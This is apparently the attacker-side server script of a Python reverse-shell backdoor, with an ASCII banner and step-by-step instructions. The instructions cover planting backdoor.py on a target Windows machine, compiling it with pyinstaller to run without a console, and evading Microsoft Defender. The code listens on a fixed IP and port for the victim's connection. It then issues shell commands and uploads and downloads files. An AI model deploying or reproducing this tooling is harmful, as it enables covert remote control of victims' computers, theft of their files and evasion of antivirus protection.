#				#	#		  #  #		#	   #		   #
#			  # #	#		  #    #	#	   #		 # #
#		     #  #	#		  #     #   #	   #		#  #
#	        #	#	#		  #    #	#	   #	   #   #
#		   ######	#		  #  #		########	  ######
#		  #		#	#		  #			#	   #	 #	   #
#		 #		#	#		  #			#	   #	#	   #
#		#       #   #######   #			#	   #   #       #   

# INSTRUCTIONS :

# Copy the backdoor.py file to Desktop of target windows machine
# Navigate to the desktop in terminal and run
#		pip install pyinstaller
#			and
#		pyinstaller backdoor.py --onefile --noconsole
# Now we got 3 folders and 1 file on Desktop. They are
#					1. dist				(Folder)
#					2. build			(Folder)
#					3. __pycache__		(Folder)
#					4. backdoor.spec 	 (File)
# We can delete all those EXCEPT "dist" Folder
# In the dist Folder we have "backdoor.exe" file
# Run server.py in kali linux (before opening backdoor.exe)
# Now open the backdoor.exe on windows
# The backdoor.exe file can be scanned with Microsoft defender, and no threats will be found !!


import socket
import json
import os


def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())


def reliable_receive():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue


def upload_file(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name):
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()


def target_communication():
	while True:
		command = input('* Shell~%s: ' % str(ip))
		reliable_send(command)
		if command == 'quit':
			break
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		else:
			result = reliable_receive()
			print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.172.229', 5555))
print("[+] Listening for connections..")
sock.listen(5)
target, ip = sock.accept()
print("[+] Target connected from " + str(ip))
target_communication()

